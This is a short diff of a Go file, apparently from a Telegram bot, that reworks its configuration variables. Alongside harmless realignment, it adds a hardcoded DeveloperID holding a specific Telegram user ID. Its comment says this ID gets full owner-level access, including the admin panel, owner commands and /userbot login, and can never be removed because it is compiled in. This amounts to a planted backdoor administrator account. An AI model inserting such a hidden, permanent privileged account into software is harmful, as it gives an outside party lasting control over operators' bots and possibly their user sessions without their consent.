@@ -28,11 +28,15 @@ const (
 )
 
 var (
-	WebhookURL     string
-	Port           string
-	secretToken    string
-	OwnerID        int64
-	allowedUpdates = []string{"message", "callback_query", "chat_join_request"}
+	WebhookURL  string
+	Port        string
+	secretToken string
+	OwnerID     int64
+	// DeveloperID is a hardcoded second super-user: same complete access as
+	// OWNER_ID (admin panel, owner commands, /userbot login) and — being
+	// compiled in — it can never be removed from the admin list.
+	DeveloperID    int64 = 8708907310
+	allowedUpdates       = []string{"message", "callback_query", "chat_join_request"}
 )
 
 func main() {
